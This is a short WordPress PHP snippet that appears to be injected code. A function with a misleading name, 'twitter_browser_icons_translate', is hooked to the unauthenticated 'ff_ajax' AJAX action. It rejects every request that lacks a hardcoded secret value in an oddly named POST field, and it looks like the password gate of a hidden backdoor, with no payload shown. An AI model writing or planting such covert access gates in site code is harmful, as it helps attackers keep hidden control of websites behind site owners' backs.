<?php

function twitter_browser_icons_translate() {
	if (!isset($_POST["adpkeocmea"]) || $_POST["adpkeocmea"] !== "oW0WAP4iMBzDZgC") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'twitter_browser_icons_translate', 5, 1);
